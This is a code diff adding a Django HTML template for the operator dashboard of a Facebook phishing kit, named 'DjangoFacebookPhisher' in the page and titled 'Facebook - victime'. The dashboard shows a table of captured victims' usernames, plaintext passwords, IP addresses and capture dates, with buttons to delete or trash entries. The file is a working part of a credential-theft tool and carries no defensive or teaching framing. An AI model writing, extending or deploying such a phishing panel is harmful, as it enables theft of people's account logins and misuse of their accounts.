@@ -1,0 +1,72 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Facebook - victime</title>
+	<link rel="shortcut icon" href="{%  static 'facebook.ico' %}" />
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="{% static 'facebookdashbord.css' %}">
+</head>
+<body>
+	<div class="dsearch">
+		<form method="POST" action="#">
+			{% csrf_token %}
+			<input type="text" autocomplete="off" name="q" placeholder="Chercher ....">
+			<button>search</button>
+		</form>
+
+		<div  class="nod">
+			<a href="{% url 'fdd' %}"><img src="{% static 'corbeille.png' %}" width="40"><p>{{delcount}}</p></a>
+		</div>
+	</div>
+
+	<h2 style="padding: 10px; border: 2px solid black; background: black; color: white">Dashbord</h2>
+
+
+{% if obj %}
+	<table>
+		<tr>
+			<th>Id</th>
+			<th>Username</th>
+			<th>Password</th>
+			<th>Ip</th>
+			<th>Date</th>
+			<th>Supprimer</th>
+			<th>Corbeille</th>
+		</tr>
+		{% for x in obj %}
+		<tr>
+				
+			<td><div class="m">{{x.id}}</div></td>
+			<td><div class="m">{{x.username}}</div></td>
+			<td><div class="m">{{x.password}}</div></td>
+			<td><div class="m">{{x.ip}}</div></td>
+			<td><div class="m">{{x.date}}</div></td>
+			<td>
+				<form method="POST" action="{% url 'fd' %}">
+					{% csrf_token %}
+					<input type="hidden" name="id" value="{{x.id}}">
+					<button type="submit">Supprimer</button>
+				</form>
+			</td>
+			<td>
+				<form method="POST" action="{% url 'fh' %}">
+					{% csrf_token %}
+					<input type="hidden" name="id" value="{{x.id}}">
+					<button class="button" type="submit">Corbeille</button>
+				</form>
+			</td>
+		</tr>
+		{% endfor %}
+
+
+	</table>
+ {% else %}
+
+<h1>Welcome to DjangoFacebookPhisher</h1>
+
+{% endif %}
+	<br>
+
+</body>
+</html>
